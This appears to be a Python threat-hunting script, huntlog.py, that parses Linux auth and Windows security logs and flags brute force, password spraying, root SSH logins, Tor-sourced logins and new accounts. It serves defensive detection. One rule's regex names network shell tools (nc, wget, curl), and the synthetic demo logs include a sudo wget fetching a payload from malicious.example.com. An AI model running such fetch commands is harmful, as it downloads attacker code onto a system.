#!/usr/bin/env python3
"""
huntlog.py - parse Linux auth logs or Windows event logs and flag suspicious activity

usage:
    python huntlog.py --demo                    # run with built-in sample logs
    python huntlog.py --demo --log-type windows
    python huntlog.py --file /var/log/auth.log
    python huntlog.py --file security.csv --log-type windows
    python huntlog.py --demo --export out.json
    python huntlog.py --list-rules
"""

import re
import json
import argparse
import sys
from datetime import datetime
from collections import defaultdict
from pathlib import Path

# use rich if installed, fall back to plain ANSI otherwise
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import box
    RICH = True
except ImportError:
    RICH = False

console = Console() if RICH else None

ANSI = {
    "red":    "\033[91m",
    "orange": "\033[33m",
    "yellow": "\033[93m",
    "cyan":   "\033[96m",
    "green":  "\033[92m",
    "dim":    "\033[2m",
    "reset":  "\033[0m",
}

def c(text, color):
    if RICH:
        return text
    return f"{ANSI.get(color, '')}{text}{ANSI['reset']}"



# DETECTION RULES
# each rule is a dict. the engine picks the right evaluator based on "type"
# -----------------------------------------------------------------------

RULES = [
    {
        "id": "HL-001",
        "name": "Brute Force Login Attempt",
        "mitre": "T1110.001",
        "tactic": "Credential Access",
        "severity": "high",
        "applies_to": ["linux", "windows"],
        "type": "threshold",
        "description": "More than 5 failed logins from the same IP.",
        "match": {"event_type": "failed_login"},
        "threshold": {"field": "source_ip", "count": 5},
        "recommendation": "Block the source IP. Check if a successful login followed from the same address.",
    },
    {
        "id": "HL-002",
        "name": "Successful Login After Multiple Failures",
        "mitre": "T1110.001",
        "tactic": "Credential Access",
        "severity": "critical",
        "applies_to": ["linux", "windows"],
        "type": "sequence",
        # fires when a successful login comes from an IP that already had 3+ failures
        "description": "Successful login from a source with prior failed attempts. Likely brute force success.",
        "match": {"event_type": "successful_login"},
        "requires_prior": {"event_type": "failed_login", "same_field": "source_ip", "min_count": 3},
        "recommendation": "Treat account as compromised. Disable it, rotate creds, check what ran post-login.",
    },
    {
        "id": "HL-003",
        "name": "Suspicious sudo Command",
        "mitre": "T1548.003",
        "tactic": "Privilege Escalation",
        "severity": "medium",
        "applies_to": ["linux"],
        "type": "pattern",
        "description": "sudo used to run something commonly abused (shells, wget, nmap, etc).",
        "match": {
            "event_type": "sudo",
            "command_pattern": r"(chmod|chown|bash|sh|python|perl|nc|netcat|nmap|wget|curl|crontab|passwd|visudo|usermod)",
        },
        "recommendation": "Look at the full sudo command in context. Check if the user normally does this.",
    },
    {
        "id": "HL-004",
        "name": "New User Account Created",
        "mitre": "T1136.001",
        "tactic": "Persistence",
        "severity": "high",
        "applies_to": ["linux", "windows"],
        "type": "pattern",
        "description": "A new local user account was created. Common persistence technique.",
        "match": {"event_type": "user_created"},
        "recommendation": "Verify with IT. If not authorized, disable the account and trace how it got created.",
    },
    {
        "id": "HL-005",
        "name": "Password Spray (Many IPs, Same Username)",
        "mitre": "T1110.003",
        "tactic": "Credential Access",
        "severity": "high",
        "applies_to": ["linux"],
        "type": "threshold",
        # different from brute force -- here many IPs hit one username vs one IP trying many passwords
        "description": "Failed logins targeting the same username from 3+ different source IPs.",
        "match": {"event_type": "failed_login"},
        "threshold": {"field": "source_ip", "count": 3, "unique": True, "group_by": "username"},
        "recommendation": "Lock the targeted account temporarily. Check if any of those IPs got in.",
    },
    {
        "id": "HL-006",
        "name": "Login Outside Business Hours",
        "mitre": "T1078",
        "tactic": "Initial Access",
        "severity": "medium",
        "applies_to": ["linux", "windows"],
        "type": "time_anomaly",
        "description": "Successful login between 10pm and 5am UTC.",
        "match": {"event_type": "successful_login", "hour_range": [22, 5]},
        "recommendation": "Verify with the account owner. Review what happened during that session.",
    },
    {
        "id": "HL-007",
        "name": "Root Login via SSH",
        "mitre": "T1078.003",
        "tactic": "Privilege Escalation",
        "severity": "critical",
        "applies_to": ["linux"],
        "type": "pattern",
        # PermitRootLogin should be 'no' in sshd_config -- this should basically never happen
        "description": "Direct root login over SSH. This should be disabled on any hardened system.",
        "match": {"event_type": "successful_login", "username": "root"},
        "recommendation": "Set PermitRootLogin no in sshd_config. Rotate root credentials. Review session commands.",
    },
    {
        "id": "HL-008",
        "name": "Login from Known Tor/Proxy Exit Node",
        "mitre": "T1090",
        "tactic": "Defense Evasion",
        "severity": "high",
        "applies_to": ["linux", "windows"],
        "type": "ip_reputation",
        "description": "Auth event from an IP in a known anonymization network.",
        "match": {"event_type": ["failed_login", "successful_login"]},
        "recommendation": "Block the IP range. If a login succeeded, rotate that account's credentials.",
    },
    {
        "id": "HL-009",
        "name": "RDP Login (Logon Type 10)",
        "mitre": "T1021.001",
        "tactic": "Lateral Movement",
        "severity": "medium",
        "applies_to": ["windows"],
        "type": "pattern",
        # event 4624 with logon type 10 = remote interactive (RDP)
        "description": "RDP session detected. Worth tracking for unusual source IPs or accounts.",
        "match": {"event_type": "successful_login", "logon_type": "10"},
        "recommendation": "Confirm RDP access was authorized. Compare source IP against known admin machines.",
    },
    {
        "id": "HL-010",
        "name": "Account Lockout Storm",
        "mitre": "T1110",
        "tactic": "Credential Access",
        "severity": "high",
        "applies_to": ["windows"],
        "type": "threshold",
        "description": "Multiple different accounts locked out in the same log window.",
        "match": {"event_type": "account_lockout"},
        "threshold": {"field": "username", "count": 3, "unique": True},
        "recommendation": "Find what host is generating the auth failures. Check DC logs for the source.",
    },
]



# LOG PARSERS
# -----------------------------------------------------------------------

# small hardcoded list of known bad IP blocks for the ip_reputation rule
# in production you'd pull this from a threat intel feed or something like AbuseIPDB
SUSPICIOUS_IPS = {
    "185.220.101.0",
    "185.220.102.0",
    "198.98.54.0",
    "162.247.74.0",
    "199.87.154.0",
}

def parse_linux_auth(lines):
    """parse /var/log/auth.log or /var/log/secure into normalized event dicts"""
    events = []

    RE_SSH_FAIL = re.compile(r"(\w+\s+\d+\s[\d:]+).*sshd.*Failed password for (?:invalid user )?(\S+) from ([\d.]+)")
    RE_SSH_OK   = re.compile(r"(\w+\s+\d+\s[\d:]+).*sshd.*Accepted (?:password|publickey) for (\S+) from ([\d.]+)")
    RE_SSH_ROOT = re.compile(r"(\w+\s+\d+\s[\d:]+).*sshd.*ROOT LOGIN")
    RE_SUDO     = re.compile(r"(\w+\s+\d+\s[\d:]+).*sudo.*:\s+(\S+)\s+:.*COMMAND=(.*)")
    RE_USERADD  = re.compile(r"(\w+\s+\d+\s[\d:]+).*useradd.*new user: name=(\S+)")
    RE_INVALID  = re.compile(r"(\w+\s+\d+\s[\d:]+).*sshd.*Invalid user (\S+) from ([\d.]+)")

    for raw in lines:
        raw = raw.strip()
        if not raw:
            continue

        if m := RE_SSH_FAIL.search(raw):
            events.append({"raw": raw, "event_type": "failed_login",
                           "timestamp": _parse_syslog_ts(m.group(1)),
                           "username": m.group(2), "source_ip": m.group(3)})
            continue

        if m := RE_INVALID.search(raw):
            events.append({"raw": raw, "event_type": "failed_login",
                           "timestamp": _parse_syslog_ts(m.group(1)),
                           "username": m.group(2), "source_ip": m.group(3)})
            continue

        if m := RE_SSH_OK.search(raw):
            events.append({"raw": raw, "event_type": "successful_login",
                           "timestamp": _parse_syslog_ts(m.group(1)),
                           "username": m.group(2), "source_ip": m.group(3)})
            continue

        if m := RE_SSH_ROOT.search(raw):
            events.append({"raw": raw, "event_type": "successful_login",
                           "timestamp": _parse_syslog_ts(m.group(1)),
                           "username": "root", "source_ip": "unknown"})
            continue

        if m := RE_SUDO.search(raw):
            events.append({"raw": raw, "event_type": "sudo",
                           "timestamp": _parse_syslog_ts(m.group(1)),
                           "username": m.group(2), "command": m.group(3).strip()})
            continue

        if m := RE_USERADD.search(raw):
            events.append({"raw": raw, "event_type": "user_created",
                           "timestamp": _parse_syslog_ts(m.group(1)),
                           "username": m.group(2)})
            continue

    return events


def parse_windows_evtx(lines):
    """
    parse a Windows Security Event Log export in CSV format
    supports event IDs: 4624 (logon), 4625 (failed), 4720 (new user), 4740 (lockout)

    to get real logs:
        wevtutil qe Security /f:text > security.txt
    or use Get-WinEvent and export to CSV (see README for the exact command)

    note: native .evtx parsing needs python-evtx which i didn't want as a hard dependency
    """
    events = []

    for raw in lines:
        raw = raw.strip()
        if not raw or raw.startswith("#"):
            continue

        parts = raw.split(",")
        if len(parts) < 4:
            continue

        ts_str     = parts[0]
        eid        = parts[1].strip()
        username   = parts[2].strip()
        src_ip     = parts[3].strip()
        logon_type = parts[4].strip() if len(parts) > 4 else "3"
        ts = _parse_iso_ts(ts_str)

        if eid == "4624":
            events.append({"raw": raw, "event_type": "successful_login",
                           "timestamp": ts, "username": username,
                           "source_ip": src_ip, "logon_type": logon_type})
        elif eid == "4625":
            events.append({"raw": raw, "event_type": "failed_login",
                           "timestamp": ts, "username": username, "source_ip": src_ip})
        elif eid == "4720":
            events.append({"raw": raw, "event_type": "user_created",
                           "timestamp": ts, "username": username})
        elif eid == "4740":
            events.append({"raw": raw, "event_type": "account_lockout",
                           "timestamp": ts, "username": username})

    return events


def _parse_syslog_ts(ts_str):
    try:
        return datetime.strptime(f"2024 {ts_str.strip()}", "%Y %b %d %H:%M:%S")
    except Exception:
        return datetime.now()


def _parse_iso_ts(ts_str):
    for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S", "%Y-%m-%d"):
        try:
            return datetime.strptime(ts_str.strip(), fmt)
        except Exception:
            continue
    return datetime.now()



# DETECTION ENGINE
# routes each rule to the right evaluator
# -----------------------------------------------------------------------

def run_rules(events, log_type):
    findings = []
    for rule in RULES:
        if log_type not in rule["applies_to"]:
            continue
        rtype     = rule["type"]
        match_cfg = rule["match"]

        if rtype == "threshold":
            findings += _eval_threshold(rule, events, match_cfg)
        elif rtype == "pattern":
            findings += _eval_pattern(rule, events, match_cfg)
        elif rtype == "sequence":
            findings += _eval_sequence(rule, events, match_cfg)
        elif rtype == "time_anomaly":
            findings += _eval_time_anomaly(rule, events, match_cfg)
        elif rtype == "ip_reputation":
            findings += _eval_ip_reputation(rule, events, match_cfg)

    return findings


def _matches_event(event, match_cfg):
    """returns true if an event satisfies all conditions in a match config"""
    et = match_cfg.get("event_type")
    if et:
        if isinstance(et, list):
            if event.get("event_type") not in et:
                return False
        else:
            if event.get("event_type") != et:
                return False

    if "username" in match_cfg and event.get("username") != match_cfg["username"]:
        return False

    if "logon_type" in match_cfg and event.get("logon_type") != match_cfg["logon_type"]:
        return False

    if "command_pattern" in match_cfg:
        if not re.search(match_cfg["command_pattern"], event.get("command", ""), re.IGNORECASE):
            return False

    return True


def _eval_threshold(rule, events, match_cfg):
    findings  = []
    thr         = rule["threshold"]
    field       = thr["field"]
    count_needed = thr["count"]
    unique      = thr.get("unique", False)
    group_by    = thr.get("group_by")

    matched = [e for e in events if _matches_event(e, match_cfg)]

    if group_by:
        # password spray: group by username, count unique IPs per username
        groups = defaultdict(set)
        for e in matched:
            groups[e.get(group_by, "unknown")].add(e.get(field, "unknown"))
        for grp_val, field_vals in groups.items():
            if len(field_vals) >= count_needed:
                supporting = [e for e in matched if e.get(group_by) == grp_val]
                findings.append(_make_finding(
                    rule,
                    f"{len(field_vals)} unique source IPs targeting username '{grp_val}'",
                    supporting[:10],
                ))
    else:
        counter = defaultdict(list)
        for e in matched:
            counter[e.get(field, "unknown")].append(e)
        for val, evts in counter.items():
            check = len(set(e.get(field) for e in evts)) if unique else len(evts)
            if check >= count_needed:
                findings.append(_make_finding(
                    rule,
                    f"{len(evts)} events where {field}='{val}'",
                    evts[:10],
                ))

    return findings


def _eval_pattern(rule, events, match_cfg):
    findings = []
    for e in events:
        if _matches_event(e, match_cfg):
            findings.append(_make_finding(
                rule,
                f"matched {e.get('event_type')} -- user='{e.get('username', '?')}' src='{e.get('source_ip', 'local')}'",
                [e],
            ))
    return findings


def _eval_sequence(rule, events, match_cfg):
    findings   = []
    prior_cfg  = rule["requires_prior"]
    same_field = prior_cfg["same_field"]
    min_count  = prior_cfg.get("min_count", 1)

    # count prior events keyed by the shared field (usually source_ip)
    prior_counter = defaultdict(int)
    for e in events:
        if e.get("event_type") == prior_cfg["event_type"]:
            prior_counter[e.get(same_field, "unknown")] += 1

    for e in events:
        if _matches_event(e, match_cfg):
            key = e.get(same_field, "unknown")
            if prior_counter[key] >= min_count:
                findings.append(_make_finding(
                    rule,
                    f"login for '{e.get('username')}' from {key} after {prior_counter[key]} failures",
                    [e],
                ))

    return findings


def _eval_time_anomaly(rule, events, match_cfg):
    findings   = []
    hour_range = match_cfg.get("hour_range", [22, 5])
    start, end = hour_range

    for e in events:
        if not _matches_event(e, match_cfg):
            continue
        ts = e.get("timestamp")
        if not ts:
            continue
        h = ts.hour
        # handles ranges that wrap midnight (e.g. 22 to 5)
        in_range = (h >= start or h <= end) if start > end else (start <= h <= end)
        if in_range:
            findings.append(_make_finding(
                rule,
                f"login at {ts.strftime('%H:%M')} UTC -- user='{e.get('username')}' src='{e.get('source_ip', '?')}'",
                [e],
            ))

    return findings


def _eval_ip_reputation(rule, events, match_cfg):
    findings = []
    for e in events:
        if not _matches_event(e, match_cfg):
            continue
        ip = e.get("source_ip", "")
        ip_slash24 = ".".join(ip.split(".")[:3]) + ".0" if ip else ""
        if ip in SUSPICIOUS_IPS or ip_slash24 in SUSPICIOUS_IPS:
            findings.append(_make_finding(
                rule,
                f"auth event from suspicious IP {ip} -- user='{e.get('username', '?')}'",
                [e],
            ))
    return findings


def _make_finding(rule, detail, supporting_events):
    return {
        "rule_id":        rule["id"],
        "rule_name":      rule["name"],
        "severity":       rule["severity"],
        "tactic":         rule["tactic"],
        "mitre":          rule["mitre"],
        "detail":         detail,
        "description":    rule["description"],
        "recommendation": rule["recommendation"],
        "event_count":    len(supporting_events),
        "sample_events":  [e.get("raw", "") for e in supporting_events[:3]],
        "timestamp":      supporting_events[0].get("timestamp", datetime.now()).isoformat() if supporting_events else None,
    }


# DEMO LOG GENERATOR
# fake but realistic logs with attack patterns baked in
# -----------------------------------------------------------------------

def generate_demo_logs(log_type):
    if log_type == "linux":
        return _gen_linux_logs()
    return _gen_windows_logs()


def _gen_linux_logs():
    lines = []

    # normal day-to-day stuff
    lines += [
        "Jan 14 08:12:01 webserver sshd[1234]: Accepted password for deploy from 10.0.1.5 port 52311 ssh2",
        "Jan 14 08:15:44 webserver sshd[1235]: Accepted publickey for alice from 10.0.1.20 port 49201 ssh2",
        "Jan 14 09:00:01 webserver sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update",
        "Jan 14 09:05:22 webserver sudo: deploy : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx",
        "Jan 14 10:33:10 webserver sshd[1240]: Accepted password for bob from 10.0.1.21 port 50022 ssh2",
    ]

    # brute force from one external IP, then successful login
    for i in range(8):
        lines.append(f"Jan 14 14:0{i}:11 webserver sshd[2{i}00]: Failed password for admin from 185.234.100.55 port 4430{i} ssh2")
    lines.append("Jan 14 14:09:01 webserver sshd[2100]: Accepted password for admin from 185.234.100.55 port 44309 ssh2")

    # password spray -- different IPs, same target account
    for ip in ["91.108.4.11", "91.108.4.22", "91.108.5.33", "103.21.244.10"]:
        lines.append(f"Jan 14 15:10:44 webserver sshd[3100]: Failed password for root from {ip} port 22 ssh2")

    # root ssh login from a tor exit node at 2am
    lines.append("Jan 14 02:44:19 webserver sshd[3200]: ROOT LOGIN on pts/0 FROM 185.220.101.5")
    lines.append("Jan 14 02:44:19 webserver sshd[3200]: Accepted password for root from 185.220.101.5 port 22222 ssh2")

    # attacker using alice's account at 3am, then doing sketchy stuff with sudo
    lines.append("Jan 14 03:17:55 webserver sshd[3300]: Accepted password for alice from 198.98.54.100 port 59001 ssh2")
    lines.append("Jan 14 03:19:01 webserver sudo: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash")
    lines.append("Jan 14 03:20:15 webserver sudo: alice : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example.com/payload.sh")

    # persistence -- backdoor user created
    lines.append("Jan 14 03:22:44 webserver useradd[4100]: new user: name=backdoor, UID=1001, GID=1001")

    return lines


def _gen_windows_logs():
    # CSV format: timestamp,event_id,username,source_ip,logon_type
    lines = ["# timestamp,event_id,username,source_ip,logon_type"]

    # normal logins throughout the day
    lines += [
        "2024-01-14T08:10:00,4624,alice,10.0.1.20,3",
        "2024-01-14T08:15:00,4624,bob,10.0.1.21,3",
        "2024-01-14T09:00:00,4624,svc_backup,10.0.1.5,3",
        "2024-01-14T10:30:00,4624,charlie,10.0.1.22,3",
    ]

    # brute force against administrator, then success
    for i in range(7):
        lines.append(f"2024-01-14T14:0{i}:00,4625,administrator,185.234.100.55,3")
    lines.append("2024-01-14T14:08:00,4624,administrator,185.234.100.55,3")

    # RDP from a host that shouldn't be doing RDP
    lines += [
        "2024-01-14T15:00:00,4624,alice,192.168.50.99,10",
        "2024-01-14T15:30:00,4624,administrator,192.168.50.99,10",
    ]

    # account lockout storm across multiple accounts (spray from 10.0.1.100)
    for user in ["alice", "bob", "charlie", "svc_sql", "svc_web"]:
        lines.append(f"2024-01-14T16:00:00,4740,{user},10.0.1.100,")

    # backdoor account created at 3am
    lines.append("2024-01-14T03:15:00,4720,backdoor$,,")

    # off-hours login from a tor exit node
    lines.append("2024-01-14T03:17:00,4624,alice,185.220.101.5,3")

    return lines



# OUTPUT
# -----------------------------------------------------------------------

SEV_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}
SEV_COLOR = {"critical": "red", "high": "orange", "medium": "yellow", "low": "cyan"}

def print_report(findings, events, log_type, source_name):
    findings = sorted(findings, key=lambda f: SEV_ORDER.get(f["severity"], 9))
    crits = [f for f in findings if f["severity"] == "critical"]
    highs = [f for f in findings if f["severity"] == "high"]
    meds  = [f for f in findings if f["severity"] == "medium"]

    if RICH:
        _print_rich(findings, events, log_type, source_name, crits, highs, meds)
    else:
        _print_plain(findings, events, log_type, source_name, crits, highs, meds)


def _print_rich(findings, events, log_type, source_name, crits, highs, meds):
    console.print()
    console.rule("[bold cyan]huntlog[/bold cyan]")
    console.print(
        f"  [dim]source:[/dim] [bold]{source_name}[/bold]   "
        f"[dim]type:[/dim] [bold]{log_type}[/bold]   "
        f"[dim]events:[/dim] [bold]{len(events)}[/bold]   "
        f"[dim]findings:[/dim] [bold]{len(findings)}[/bold]"
    )
    console.print()

    if not findings:
        console.print("[green]  no threats detected[/green]")
        return

    t = Table(box=box.SIMPLE_HEAVY, show_header=True, header_style="bold dim")
    t.add_column("ID",       style="dim",     width=8)
    t.add_column("Severity", width=10)
    t.add_column("Rule",     width=44)
    t.add_column("MITRE",    style="magenta", width=12)
    t.add_column("Tactic",   style="dim",     width=28)
    t.add_column("Hits",     justify="right", width=5)

    sev_styles = {"critical": "bold red", "high": "yellow", "medium": "cyan", "low": "dim"}
    for f in findings:
        sev = f["severity"]
        t.add_row(
            f["rule_id"],
            Text(sev.upper(), style=sev_styles.get(sev, "white")),
            f["rule_name"],
            f["mitre"],
            f["tactic"],
            str(f["event_count"]),
        )
    console.print(t)

    for f in findings:
        sev   = f["severity"]
        color = {"critical": "red", "high": "yellow", "medium": "cyan", "low": "blue"}.get(sev, "white")
        header = (
            f"[{color}][{sev.upper()}][/{color}]  "
            f"[{color}]{f['rule_name']}[/{color}]  "
            f"[dim]({f['rule_id']} / {f['mitre']})[/dim]"
        )
        body  = f"[dim]tactic:[/dim]   {f['tactic']}\n"
        body += f"[dim]detail:[/dim]   {f['detail']}\n"
        body += f"[dim]desc:[/dim]     {f['description']}\n\n"
        body += f"[bold green]response:[/bold green] {f['recommendation']}\n"
        if f["sample_events"]:
            body += f"\n[dim]raw event:[/dim]\n  [dim]{f['sample_events'][0][:120]}[/dim]"
        console.print(Panel(body, title=header, border_style=color, expand=True))

    console.print()
    console.rule(f"[dim]{len(crits)} critical / {len(highs)} high / {len(meds)} medium[/dim]")
    console.print()


def _print_plain(findings, events, log_type, source_name, crits, highs, meds):
    w = 72
    print("\n" + "=" * w)
    print("  huntlog")
    print(f"  source: {source_name} | type: {log_type} | events: {len(events)} | findings: {len(findings)}")
    print("=" * w)

    if not findings:
        print("\n  no threats detected\n")
        return

    for f in findings:
        sev = f["severity"].upper()
        col = SEV_COLOR.get(f["severity"], "reset")
        print(f"\n{'-' * w}")
        print(f"  {c(f'[{sev}]', col)}  {f['rule_name']}  ({f['rule_id']} / {f['mitre']})")
        print(f"  tactic:   {f['tactic']}")
        print(f"  detail:   {f['detail']}")
        print(f"  desc:     {f['description']}")
        print(f"  {c('response:', 'green')} {f['recommendation']}")
        if f["sample_events"]:
            print(f"  sample:   {f['sample_events'][0][:100]}")

    print(f"\n{'=' * w}")
    print(
        f"  {c(str(len(crits)) + ' critical', 'red')} / "
        f"{c(str(len(highs)) + ' high', 'orange')} / "
        f"{c(str(len(meds)) + ' medium', 'yellow')}"
    )
    print("=" * w + "\n")


def export_json(findings, events, output_path):
    report = {
        "generated":     datetime.now().isoformat(),
        "event_count":   len(events),
        "finding_count": len(findings),
        "findings":      findings,
    }
    with open(output_path, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"  exported to {output_path}")



# CLI
# -----------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        prog="huntlog",
        description="parse auth/event logs and flag suspicious activity",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  python huntlog.py --demo
  python huntlog.py --demo --log-type windows
  python huntlog.py --file /var/log/auth.log
  python huntlog.py --file security.csv --log-type windows
  python huntlog.py --demo --export findings.json
        """,
    )
    parser.add_argument("--file",       "-f", help="log file to analyze")
    parser.add_argument("--log-type",   "-t", choices=["linux", "windows"], default="linux")
    parser.add_argument("--demo",       "-d", action="store_true", help="run against built-in sample logs")
    parser.add_argument("--export",     "-e", metavar="FILE", help="write findings to a JSON file")
    parser.add_argument("--list-rules",       action="store_true", help="print all rules and exit")

    args = parser.parse_args()

    if args.list_rules:
        print(f"\n  {len(RULES)} rules loaded\n")
        for r in RULES:
            print(f"  {r['id']}  [{r['severity'].upper():8}]  {r['name']}")
            print(f"           {r['mitre']} / {r['tactic']} / applies to: {', '.join(r['applies_to'])}")
            print()
        return

    if not args.demo and not args.file:
        parser.print_help()
        sys.exit(1)

    if args.demo:
        source_name = f"demo-{args.log_type}.log"
        lines = generate_demo_logs(args.log_type)
    else:
        path = Path(args.file)
        if not path.exists():
            print(f"error: file not found: {args.file}", file=sys.stderr)
            sys.exit(1)
        source_name = str(path)
        with open(path, "r", errors="replace") as f:
            lines = f.readlines()

    log_type = args.log_type
    events   = parse_linux_auth(lines) if log_type == "linux" else parse_windows_evtx(lines)

    if not events:
        print(f"\n  no parseable events found in '{source_name}'")
        print("  make sure --log-type matches your file format\n")
        sys.exit(0)

    findings = run_rules(events, log_type)
    print_report(findings, events, log_type, source_name)

    if args.export:
        export_json(findings, events, args.export)


if __name__ == "__main__":
    main()
